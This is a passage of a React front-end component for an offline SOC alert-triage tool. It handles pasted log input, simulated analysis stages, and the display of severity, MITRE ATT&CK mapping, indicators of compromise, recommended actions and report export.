  const [diagnosis, setDiagnosis]       = useState(null);
  const [history, setHistory]           = useState([]);
  const [guideOpen, setGuideOpen]       = useState(false);
  function handleInputChange(e) {
    setInput(e.target.value);
    if (validationIssues.length > 0) setValidationIssues([]);
    if (diagnosis) setDiagnosis(null);
    if (result) setResult(null);
  }

  async function analyzeAlert() {
    const issues = VALIDATION_RULES.filter(r => r.test(input));
    if (issues.length > 0) { setValidationIssues(issues); return; }

    setLoading(true);
    setValidationIssues([]);
    setDiagnosis(null);
    setResult(null);

    setLoadingStage("Detecting log format...");
    await new Promise(r => setTimeout(r, 200));
    setLoadingStage("Running triage analysis...");
    await new Promise(r => setTimeout(r, 300));

    const parsed = analyzeOffline(input);
    setResult(parsed);
    setHistory(h => [{
      input: input.slice(0, 60) + (input.length > 60 ? "..." : ""),
      result: parsed,
      ts: new Date().toLocaleTimeString()
    }, ...h.slice(0, 4)]);

    setLoading(false);
    setLoadingStage("");
  }

  function loadSample(s) {
    setInput(s.raw);
    setResult(null);
    setDiagnosis(null);
    setValidationIssues([]);
  }

  function exportReport() {
    if (!result) return;
    const ts = new Date().toISOString();
    const lines = [
      "SOC TRIAGE REPORT",
      `Generated: ${ts}`,
      "=".repeat(60),
      "",
      `SEVERITY:              ${result.severity}`,
      `THREAT TYPE:           ${result.threat_type}`,
      `LOG FORMAT DETECTED:   ${result.log_format_detected || "Unknown"}`,
      `CONFIDENCE:            ${result.confidence}%`,
      `FALSE POSITIVE RISK:   ${result.false_positive_likelihood}`,
      "",
      "MITRE ATT&CK",
      `  Tactic:    ${result.mitre_tactic}`,
      `  Technique: ${result.mitre_technique}`,
      "",
      "SUMMARY",
      result.summary,
      "",
      "INDICATORS OF COMPROMISE",
      ...(result.iocs || []).map(ioc => `  - ${ioc}`),
      "",
      "RECOMMENDED ACTION",
      `  ${result.recommended_action}`,
      "",
      ...(result.analyst_notes ? ["ANALYST NOTES", `  ${result.analyst_notes}`, ""] : []),
      "=".repeat(60),
      "RAW ALERT INPUT",
      input
    ];
    const blob = new Blob([lines.join("\n")], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `triage-report-${ts.slice(0, 19).replace(/[:.]/g, "-")}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  }

  const sev = result ? SEVERITY_CONFIG[result.severity] || SEVERITY_CONFIG.INFORMATIONAL : null;
  const inputTooShort = input.length > 0 && input.trim().length < 25;

  return (
    <div style={{
      minHeight: "100vh",
      background: "#080c0e",
      fontFamily: "'JetBrains Mono','Fira Code','Courier New',monospace",
      color: "#c9d8d3",
      padding: "0 0 60px 0"
    }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap');
        @keyframes blink  { 0%,100%{opacity:1} 50%{opacity:0} }
        @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
        @keyframes pulse  { 0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,0.4)} 50%{box-shadow:0 0 0 8px rgba(0,255,136,0)} }
        .analyze-btn:hover:not(:disabled){ background:#00ff88 !important; color:#080c0e !important; }
        .sample-btn:hover { border-color:#00ff88 !important; color:#00ff88 !important; }
        .export-btn:hover { border-color:#00ff88 !important; color:#00ff88 !important; }
        .triage-result { animation: fadeIn 0.4s ease; }
        textarea { resize:vertical; }
        textarea:focus { outline:none; border-color:#00ff88 !important; box-shadow:0 0 0 1px #00ff88, 0 0 20px rgba(0,255,136,0.08) !important; }
        ::-webkit-scrollbar{width:4px} ::-webkit-scrollbar-track{background:#0d1517} ::-webkit-scrollbar-thumb{background:#1e3028;border-radius:2px}
        .ioc-tag:hover { background:rgba(0,255,136,0.15) !important; }
      `}</style>

      <ScanlineOverlay />

      {/* Header */}
      <div style={{ borderBottom:"1px solid #1a2e24", padding:"24px 32px", display:"flex", alignItems:"center", gap:16, background:"rgba(0,255,136,0.02)" }}>
        <div style={{ width:10, height:10, borderRadius:"50%", background:"#00ff88", animation:"pulse 2s infinite" }} />
        <div>
          <div style={{ fontFamily:"'Orbitron',monospace", fontSize:13, fontWeight:700, letterSpacing:4, color:"#00ff88" }}>SOC TRIAGE</div>
          <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginTop:1 }}>ALERT ANALYSIS SYSTEM v2.0 // OFFLINE</div>
        </div>
        <div style={{ marginLeft:"auto", fontSize:10, color:"#3a5a48", letterSpacing:1 }}>
          {new Date().toISOString().slice(0,19).replace("T"," ")} UTC
        </div>
      </div>

      <div style={{ maxWidth:960, margin:"0 auto", padding:"32px 24px" }}>

        <FormatGuide open={guideOpen} onToggle={() => setGuideOpen(o => !o)} />

        {/* Samples */}
        <div style={{ marginBottom:20 }}>
          <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:10 }}>// SAMPLE ALERTS</div>
          <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
            {SAMPLE_ALERTS.map(s => (
              <button key={s.id} className="sample-btn" onClick={() => loadSample(s)} style={{
                background:"transparent", border:"1px solid #1a2e24", color:"#5a8a6a",
                padding:"5px 12px", fontSize:10, cursor:"pointer", letterSpacing:1,
                transition:"all 0.15s", fontFamily:"inherit"
              }}>
                <span style={{ color:"#3a5a48", fontSize:9 }}>[{s.type}]</span> {s.label}
              </button>
            ))}
          </div>
        </div>

        {/* Input */}
        <div style={{ marginBottom:8 }}>
          <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:8 }}>
            <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2 }}>// PASTE ALERT OR LOG SNIPPET</div>
            {input.length > 0 && (
              <span style={{ fontSize:10, color: inputTooShort ? "#ff9f0a" : "#3a5a48" }}>
                {input.length} chars
              </span>
            )}
          </div>
          <textarea
            value={input}
            onChange={handleInputChange}
            placeholder={"Paste any log format here — syslog, Windows Event, Suricata, Zeek, CEF, Splunk, or free-form narrative.\n\nNot sure how to format your input? Expand the Format Guide above."}
            rows={9}
            style={{
              width:"100%", boxSizing:"border-box",
              background:"#0d1517",
              border:`1px solid ${validationIssues.length > 0 ? "#ff9f0a" : "#1a2e24"}`,
              color:"#c9d8d3", padding:"16px", fontSize:12,
              lineHeight:1.7, fontFamily:"inherit",
              transition:"border-color 0.2s, box-shadow 0.2s"
            }}
          />
        </div>

        {inputTooShort && (
          <div style={{ fontSize:10, color:"#ff9f0a", marginBottom:10, letterSpacing:1 }}>
            ⚠ Input too short — paste a complete log line or alert
          </div>
        )}

        {validationIssues.length > 0 && <ValidationErrors issues={validationIssues} />}

        <button
          className="analyze-btn"
          onClick={analyzeAlert}
          disabled={loading || !input.trim()}
          style={{
            background: loading ? "#0d1517" : "transparent",
            border:`1px solid ${loading ? "#1a2e24" : "#00ff88"}`,
            color: loading ? "#3a5a48" : "#00ff88",
            padding:"12px 32px", fontSize:12,
            cursor: loading || !input.trim() ? "default" : "pointer",
            letterSpacing:3, fontFamily:"inherit", fontWeight:600,
            transition:"all 0.15s", width:"100%", marginBottom:28
          }}
        >
          {loading
            ? <span>{loadingStage || "ANALYZING"}<TerminalCursor /></span>
            : "→ ANALYZE ALERT"}
        </button>

        {diagnosis && <InputDiagnosis diagnosis={diagnosis} />}

        {/* Result */}
        {result && sev && (
          <div className="triage-result">

            {result.log_format_detected && (
              <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:8 }}>
                FORMAT DETECTED: <span style={{ color:"#5a8a6a" }}>{result.log_format_detected}</span>
              </div>
            )}

            <div style={{
              border:`1px solid ${sev.color}`, background:sev.bg,
              padding:"14px 20px", marginBottom:1,
              display:"flex", alignItems:"center", justifyContent:"space-between"
            }}>
              <div style={{ display:"flex", alignItems:"center", gap:12 }}>
                <div style={{ fontFamily:"'Orbitron',monospace", fontSize:18, fontWeight:900, color:sev.color, letterSpacing:3 }}>
                  {sev.label}
                </div>
                <div style={{ fontSize:11, color:sev.color, opacity:0.7 }}>{result.threat_type}</div>
              </div>
              <div style={{ fontSize:11, color:"#5a8a6a" }}>
                CONFIDENCE: <span style={{ color: result.confidence >= 70 ? "#c9d8d3" : "#ff9f0a" }}>{result.confidence}%</span>
              </div>
            </div>

            {result.confidence < 60 && (
              <div style={{ background:"rgba(255,159,10,0.05)", border:"1px solid rgba(255,159,10,0.25)", borderTop:"none", padding:"8px 20px", marginBottom:1 }}>
                <span style={{ fontSize:10, color:"#ff9f0a", letterSpacing:1 }}>⚠ LOW CONFIDENCE — </span>
                <span style={{ fontSize:10, color:"#7a8a80" }}>Add timestamps, IPs, or more event context to improve accuracy.</span>
              </div>
            )}

            <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:1, marginBottom:1 }}>

              <div style={{ gridColumn:"1 / -1", background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:8 }}>// SUMMARY</div>
                <div style={{ fontSize:13, lineHeight:1.8, color:"#c9d8d3" }}>{result.summary}</div>
              </div>

              <div style={{ background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// MITRE ATT&CK</div>
                <div style={{ fontSize:11, color:"#5a8a6a", marginBottom:4 }}>TACTIC</div>
                <div style={{ fontSize:13, color:"#c9d8d3", marginBottom:12 }}>{result.mitre_tactic}</div>
                <div style={{ fontSize:11, color:"#5a8a6a", marginBottom:4 }}>TECHNIQUE</div>
                <div style={{ fontSize:13, color:"#00ff88" }}>{result.mitre_technique}</div>
              </div>

              <div style={{ background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// ASSESSMENT</div>
                <div style={{ fontSize:11, color:"#5a8a6a", marginBottom:4 }}>FALSE POSITIVE LIKELIHOOD</div>
                <div style={{ fontSize:20, fontFamily:"'Orbitron',monospace", fontWeight:700,
                  color: result.false_positive_likelihood === "Low" ? "#30d158" : result.false_positive_likelihood === "High" ? "#ff9f0a" : "#ffd60a" }}>
                  {result.false_positive_likelihood?.toUpperCase()}
                </div>
              </div>

              <div style={{ gridColumn:"1 / -1", background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// INDICATORS OF COMPROMISE</div>
                {result.iocs?.length > 0 ? (
                  <div style={{ display:"flex", flexWrap:"wrap", gap:8 }}>
                    {result.iocs.map((ioc, i) => (
                      <span key={i} className="ioc-tag" style={{
                        background:"rgba(0,255,136,0.06)", border:"1px solid #1a3a28",
                        padding:"4px 10px", fontSize:11, color:"#5aaa7a",
                        letterSpacing:0.5, transition:"background 0.15s", cursor:"default"
                      }}>{ioc}</span>
                    ))}
                  </div>
                ) : (
                  <div style={{ fontSize:11, color:"#3a5a48" }}>No discrete IOCs extracted — review raw input manually.</div>
                )}
              </div>

              <div style={{ gridColumn:"1 / -1", background:"#0a1812", border:`1px solid ${sev.color}33`, padding:20 }}>
                <div style={{ fontSize:10, color:sev.color, opacity:0.6, letterSpacing:2, marginBottom:8 }}>// RECOMMENDED ACTION</div>
                <div style={{ fontSize:13, color:"#c9d8d3", lineHeight:1.7 }}>→ {result.recommended_action}</div>
              </div>

              {result.analyst_notes && (
                <div style={{ gridColumn:"1 / -1", background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                  <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:8 }}>// ANALYST NOTES</div>
                  <div style={{ fontSize:11, color:"#5a8a6a", lineHeight:1.7 }}>{result.analyst_notes}</div>
                </div>
              )}
            </div>

            <button className="export-btn" onClick={exportReport} style={{
              background:"transparent", border:"1px solid #1a2e24",
              color:"#5a8a6a", padding:"10px 24px", fontSize:11,
              cursor:"pointer", letterSpacing:2, fontFamily:"inherit",
              marginTop:12, transition:"all 0.15s"
            }}>
              ↓ EXPORT REPORT (.txt)
            </button>
          </div>
        )}

        {/* History */}
        {history.length > 0 && (
          <div style={{ marginTop:48 }}>
            <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// ANALYSIS HISTORY</div>
            {history.map((h, i) => {
              const s = SEVERITY_CONFIG[h.result.severity] || SEVERITY_CONFIG.INFORMATIONAL;
              return (
                <div key={i} style={{ display:"flex", alignItems:"center", gap:12, padding:"10px 0", borderBottom:"1px solid #0f1e18", fontSize:11 }}>
                  <span style={{ color:"#3a5a48", width:60, flexShrink:0 }}>{h.ts}</span>
                  <span style={{ color:s.color, width:80, flexShrink:0, fontFamily:"'Orbitron',monospace", fontSize:10 }}>{s.label}</span>
                  <span style={{ color:"#5a8a6a", flexShrink:0 }}>{h.result.threat_type}</span>
                  <span style={{ color:"#3a5a48", marginLeft:"auto", maxWidth:260, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{h.input}</span>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}
